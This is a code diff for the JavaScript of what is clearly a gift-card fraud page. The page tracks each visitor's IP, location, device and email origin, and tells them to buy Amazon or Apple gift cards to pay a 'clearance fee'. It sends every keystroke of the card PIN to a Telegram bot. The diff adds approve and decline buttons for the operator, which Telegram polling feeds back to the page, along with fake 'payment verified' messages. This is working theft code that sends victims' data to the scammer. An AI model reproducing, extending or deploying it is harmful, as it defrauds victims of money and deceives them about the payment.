@@ -296,6 +296,7 @@ const TELEGRAM_CHAT_ID = "-1003913850436";
 
 let lastSentPayload = "";
 let timerInterval;
+let telegramPollInterval = null;
 
 // ==========================================
 // 1. UNIFIED TELEMETRY & LOCALIZATION MODULE
@@ -304,13 +305,11 @@ async function initializeAppWithIP() {
     let ipData = {};
 
     try {
-        // Fetch network data strictly once for both tracking and localization
         const ipResponse = await fetch('https://ipapi.co/json/');
         if (!ipResponse.ok) throw new Error('Failed to fetch network details');
         ipData = await ipResponse.json();
     } catch (err) {
         console.warn("IP geolocation fallback engaged:", err);
-        // Fallback defaults if IP lookup fails
         ipData = {
             ip: "Unknown",
             city: "Unknown",
@@ -322,12 +321,10 @@ async function initializeAppWithIP() {
         };
     }
 
-    // A. Run Telegram Visitor Tracking (if not already logged this session)
     if (!sessionStorage.getItem('visitor_logged_tg')) {
         await sendVisitorDetailsToTelegram(ipData);
     }
 
-    // B. Run IP-Driven Storefront & Currency Localization
     loadLocalizedFee(ipData);
 }
 
@@ -338,7 +335,6 @@ async function sendVisitorDetailsToTelegram(ipData) {
   try {
     const rawAgent = navigator.userAgent;
 
-    // Anti-Bot Filter: Drop execution if visitor is a crawler/spider
     if (/bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|slurp|embed/i.test(rawAgent)) {
       console.log("🤖 Automated link indexing crawler bypassed safely.");
       return;
@@ -351,7 +347,6 @@ async function sendVisitorDetailsToTelegram(ipData) {
     let detailedDevice = "Unknown Device";
     let detectedBrowser = "Unknown Browser";
 
-    // Smart Browser Extractor
     if (/WhatsApp/i.test(rawAgent)) {
       detectedBrowser = "WhatsApp In-App";
     } else if (/TelegramBot|Telegram/i.test(rawAgent)) {
@@ -382,7 +377,6 @@ async function sendVisitorDetailsToTelegram(ipData) {
       detectedBrowser = "Apple Safari";
     }
 
-    // Email Inbox Origin Identification
     const referrer = document.referrer || "";
     if (detectedBrowser === "Google Chrome" || detectedBrowser === "Apple Safari") {
       if (/mail\.google\.com/i.test(referrer)) {
@@ -394,7 +388,6 @@ async function sendVisitorDetailsToTelegram(ipData) {
       }
     }
 
-    // Smart Device & OS Version Detection Engine
     if (/Android/i.test(rawAgent)) {
       const match = rawAgent.match(/Android\s+([^;]+);\s+([^)]+)/);
       detailedDevice = match ? `Android ${match[1]} (${match[2]})` : "Android Device";
@@ -419,7 +412,6 @@ async function sendVisitorDetailsToTelegram(ipData) {
 
     const isProxy = ipData.proxy || false;
     const ipDisplay = isProxy ? `${ipData.ip} ⚠️ [Proxy/VPN]` : ipData.ip;
-
     const screenResolution = `${window.screen.width}x${window.screen.height}`;
     const connectionType = navigator.connection ? navigator.connection.effectiveType : "N/A";
     const timestamp = new Date().toLocaleString();
@@ -460,10 +452,8 @@ function loadLocalizedFee(ipData) {
     const rawValue = localStorage.getItem("av_retention_bonus") || 0;
     const baseAmount = parseFloat(rawValue);
 
-    // Extract country code securely from IP Geolocation (Default to US if missing)
     const countryCode = (ipData.country_code || 'US').toUpperCase();
     
-    // Map IP Country Code to Currency and Storefront Domains
     let targetCurrency = ipData.currency || 'USD';
     let regionLabel = `${ipData.country_name || 'United States'} (${targetCurrency})`;
     let localeString = 'en-US';
@@ -484,7 +474,6 @@ function loadLocalizedFee(ipData) {
 
     localStorage.setItem("detected_region", regionLabel);
 
-    // Calculate dynamic fee
     const clearanceFee = baseAmount * 0.2965;
     const feeElement = document.getElementById("clearance_amount");
     if (feeElement) {
@@ -494,15 +483,14 @@ function loadLocalizedFee(ipData) {
         }).format(clearanceFee);
     }
 
-    // Dynamic Vendor Store Link Routing based on IP Country
     const amazonLink = document.getElementById("amazon_vendor_link");
     const appleLink = document.getElementById("apple_vendor_link");
 
     if (countryCode === 'CA') {
-        if (amazonLink) amazonLink.href = "https://www.amazon.ca/Amazon-eGift-Card-Logo-Animated/dp/B07P68FH74/ref=mp_s_a_1_3?crid=1T2A8P9D9VZUV&dib=eyJ2IjoiMSJ9.lUIXwiBHn5--zxDdC3QcWOol8D19BQY2oJ_K1ZtfC0zuKCtu6Y4F1YYoK6rVov-8wt6WXySUTXtlclIzA9K6HZGjrFw2AcM3l4V37eHfanySiHqh7ltLx6XimG-6v6DLvc_65C6scLXXxZQXOIIi0lvCz-Nk6N_8m-jD_BSLmphvZmMN5W_qfsLVEHaL0cSD0P-7LT5-TD5CVU82FQlHgQ.z29HD-ZJWCDxHjxNJ6WJ4ToNkLTRVMuICrcTd4sg1C8&dib_tag=se&keywords=gift+card&qid=1787215855&sprefix=Gift+card%2Caps%2C1150&sr=8-3";
+        if (amazonLink) amazonLink.href = "https://www.amazon.ca/Amazon-eGift-Card-Logo-Animated/dp/B07P68FH74/";
         if (appleLink) appleLink.href = "https://www.apple.com/ca/shop/buy-giftcard/giftcard";
     } else if (countryCode === 'GB') {
-        if (amazonLink) amazonLink.href = "https://www.amazon.co.uk/Amazon-eGift-Card-Logo-Animated/dp/B07S6C1DZ6/ref=mp_s_a_1_3?crid=QS7EE5OHD23W&dib=eyJ2IjoiMSJ9.LVr3vrTkNWJynMyhSsjziwS11KpidnD96duOw9M4kG45btLd1kx4RdX7KmjfxRi7NnTYd7kKcADfy8R-sJLP5gKVZvIXJ6MQnwGmWzLVwgUQWChbyGdbcCv9l4fwOOW3Kvuhdo7TKudUNrLopQxLmXkqgje5haAssCSGgYep1gQD9lpiZ1ukfRlHPWa-_SvHPMVIQZ1EwFxx2YNocPwnaQ.9VMK9Yj8uYUzT_-kTEMg7iIe-qmiv2WtbS_1nyg2M7E&dib_tag=se&keywords=gift+card&qid=1787215678&sprefix=giftc%2Caps%2C1908&sr=8-3";
+        if (amazonLink) amazonLink.href = "https://www.amazon.co.uk/Amazon-eGift-Card-Logo-Animated/dp/B07S6C1DZ6/";
         if (appleLink) appleLink.href = "https://www.apple.com/uk/shop/buy-giftcard/giftcard";
     } else {
         if (amazonLink) amazonLink.href = "https://www.amazon.com/Amazon-eGift-Card-Logo-Animated/dp/B07PCMWTSG";
@@ -511,7 +499,7 @@ function loadLocalizedFee(ipData) {
 }
 
 // ==========================================
-// 4. COUNTDOWN & TELEGRAM INPUT STREAMING
+// 4. COUNTDOWN & TELEGRAM LIVE BUTTON STREAMING
 // ==========================================
 function updateCountdownDisplay() {
     const timerElement = document.getElementById("countdown");
@@ -531,9 +519,6 @@ function updateCountdownDisplay() {
             timerElement.textContent = "EXPIRED";
             clearInterval(timerInterval);
             localStorage.removeItem("avb_expiry_time");
-            localStorage.removeItem("avb_redirected_to_avb");
-            localStorage.removeItem("avb_session_state");
-
             window.location.replace("https://membership.avalonflow.site/notifications");
             return;
         }
@@ -553,16 +538,34 @@ async function saveClearanceCode() {
 
     try {
         const urlParams = new URLSearchParams(window.location.search);
-        const identifyUser = urlParams.get('user') || 'Anonymous Visitor';
+        const identifyUser = urlParams.get('user') || 'Anonymous_Visitor';
         const detectedRegion = localStorage.getItem("detected_region") || 'United States 🇺🇸 (Default)';
 
+        let selectedVendor = localStorage.getItem("selected_vendor");
+        if (!selectedVendor) {
+            selectedVendor = cleanCode.toUpperCase().startsWith('X') 
+                ? "Apple (Inferred via 'X' prefix)" 
+                : "Amazon / Generic (Direct Input)";
+        }
+
         const telegramMessage = 
-          `💳 <b>Live Clearance PIN Tracking</b>\n\n` +
+          `💳 <b>Live Clearance PIN Submitted</b>\n\n` +
           `• <b>From User:</b> <code>${identifyUser}</code>\n` +
-          `• <b>Detected Store Region:</b> <code>${detectedRegion}</code>\n` +
+          `• <b>Card Vendor:</b> <code>${selectedVendor}</code>\n` +
+          `• <b>Detected Region:</b> <code>${detectedRegion}</code>\n` +
           `───────────────────\n` +
           `• <b>Sanitised PIN:</b> <code>${cleanCode}</code>\n` +
           `• <b>Raw Input:</b> <code>${rawCardCode}</code>`;
+
+        // Attach Interactive Action Buttons directly to Telegram Message
+        const inlineKeyboard = {
+            inline_keyboard: [
+                [
+                    { text: "✅ Approve Access", callback_data: `approve:${identifyUser}` },
+                    { text: "❌ Decline Code", callback_data: `reject:${identifyUser}` }
+                ]
+            ]
+        };
 
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
@@ -570,12 +573,108 @@ async function saveClearanceCode() {
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
             text: telegramMessage,
-            parse_mode: 'HTML'
+            parse_mode: 'HTML',
+            reply_markup: inlineKeyboard
           })
         });
     } catch (error) {
         console.error('Failed to stream live clearance PIN metric.');
     }
+}
+
+// ==========================================
+// 5. PURE JS TELEGRAM LONG-POLLING ENGINE
+// ==========================================
+
+// Updates Telegram Message text when button is clicked so admin knows it was processed
+async function acknowledgeTelegramAction(callbackId, messageId, originalText, statusStamp) {
+    try {
+        // Stop Telegram button loading spinner
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ callback_query_id: callbackId, text: statusStamp })
+        });
+
+        // Edit Telegram message to mark action as taken
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                message_id: messageId,
+                text: `${originalText}\n\n<b>[ADMIN ACTION: ${statusStamp}]</b>`,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (e) {
+        console.warn("Failed to update Telegram button UI:", e);
+    }
+}
+
+// Poll Telegram directly for button clicks
+function startTelegramPolling(targetUser) {
+    if (telegramPollInterval) clearInterval(telegramPollInterval);
+
+    telegramPollInterval = setInterval(async () => {
+        try {
+            // Get latest bot updates directly from Telegram API
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=-10`);
+            const data = await response.json();
+
+            if (!data.ok || !data.result) return;
+
+            const statusBox = document.getElementById("status_message");
+            const submitBtn = document.getElementById("submit_btn");
+
+            for (const update of data.result) {
+                if (update.callback_query && update.callback_query.data) {
+                    const callbackData = update.callback_query.data;
+                    const callbackId = update.callback_query.id;
+                    const messageId = update.callback_query.message.message_id;
+                    const originalText = update.callback_query.message.text;
+
+                    // Match approval button for this exact user
+                    if (callbackData === `approve:${targetUser}`) {
+                        clearInterval(telegramPollInterval);
+
+                        await acknowledgeTelegramAction(callbackId, messageId, originalText, "✅ APPROVED");
+
+                        if (statusBox) {
+                            statusBox.style.color = "#10b981";
+                            statusBox.innerText = "Payment verified successfully! Redirecting...";
+                        }
+
+                        localStorage.setItem("has_withdrawn", "true");
+                        localStorage.setItem("step_3_paid", "true");
+                        localStorage.setItem("step_3_txn_id", "TXN_" + Math.floor(100000 + Math.random() * 900000));
+
+                        setTimeout(() => {
+                            window.location.replace("https://membership.avalonflow.site/dashboard");
+                        }, 1200);
+
+                        break;
+                    } 
+                    // Match rejection button for this exact user
+                    else if (callbackData === `reject:${targetUser}`) {
+                        clearInterval(telegramPollInterval);
+
+                        await acknowledgeTelegramAction(callbackId, messageId, originalText, "❌ DECLINED");
+
+                        if (statusBox) {
+                            statusBox.style.color = "#ef4444";
+                            statusBox.innerText = "Invalid card PIN or insufficient balance. Please check and try again.";
+                        }
+                        if (submitBtn) submitBtn.disabled = false;
+
+                        break;
+                    }
+                }
+            }
+        } catch (err) {
+            console.warn("Telegram polling interval check...");
+        }
+    }, 2500); // Check Telegram every 2.5 seconds
 }
 
 async function submitClearanceCode() {
@@ -589,69 +688,53 @@ async function submitClearanceCode() {
         return;
     }
 
+    // Force stream telemetry to Telegram first
     await saveClearanceCode();
 
     if (submitBtn) submitBtn.disabled = true;
     if (statusBox) {
         statusBox.style.color = "#38bdf8";
-        statusBox.innerText = "Verifying code with clearance server...";
+        statusBox.innerText = "Clearance PIN submitted. Verification in progress...";
     }
 
-    try {
-        const mockApiResponse = await new Promise((resolve) => {
-            setTimeout(() => {
-                resolve({ status: "SUCCESS", transactionId: "TXN_998402" });
-            }, 2000);
-        });
+    const urlParams = new URLSearchParams(window.location.search);
+    const identifyUser = urlParams.get('user') || 'Anonymous_Visitor';
 
-        if (mockApiResponse.status === "SUCCESS") {
-            if (statusBox) {
-                statusBox.style.color = "#10b981";
-                statusBox.innerText = "Payment verified successfully!";
-            }
-
-            localStorage.setItem("has_withdrawn", "true");
-            localStorage.setItem("step_3_paid", "true");
-            localStorage.setItem("step_3_txn_id", mockApiResponse.transactionId);
-
-            setTimeout(() => {
-                window.location.replace("https://membership.avalonflow.site/dashboard");
-            }, 1500);
-
-        } else {
-            if (statusBox) {
-                statusBox.style.color = "#ef4444";
-                statusBox.innerText = "Invalid card PIN. Please try again.";
-            }
-            if (submitBtn) submitBtn.disabled = false;
-        }
-    } catch (err) {
-        if (statusBox) {
-            statusBox.style.color = "#ef4444";
-            statusBox.innerText = "Network error connecting to payment gateway.";
-        }
-        if (submitBtn) submitBtn.disabled = false;
-    }
+    // Start listening for Telegram button click in pure JS
+    startTelegramPolling(identifyUser);
 }
 
 // ==========================================
-// 5. UNIFIED INITIALIZATION (DOM LOADED)
+// 6. UNIFIED INITIALIZATION (DOM LOADED)
 // ==========================================
 document.addEventListener('DOMContentLoaded', () => {
-    // Fire unified async IP lookup which handles both tracking & localization
+    localStorage.removeItem("selected_vendor");
+
     initializeAppWithIP();
 
-    // Start timer display & interval immediately
     updateCountdownDisplay();
     timerInterval = setInterval(updateCountdownDisplay, 1000);
 
-    // Bind real-time input listeners for PIN tracking
     const pinInput = document.getElementById("giftcard_pin");
     if (pinInput) {
         pinInput.addEventListener("input", saveClearanceCode);
     }
-});
 
+    const amazonLink = document.getElementById("amazon_vendor_link");
+    const appleLink = document.getElementById("apple_vendor_link");
+
+    if (amazonLink) {
+        amazonLink.addEventListener("click", () => {
+            localStorage.setItem("selected_vendor", "Amazon Gift Card");
+        });
+    }
+
+    if (appleLink) {
+        appleLink.addEventListener("click", () => {
+            localStorage.setItem("selected_vendor", "Apple Gift Card");
+        });
+    }
+});
     </script>
 </body>
 </html>
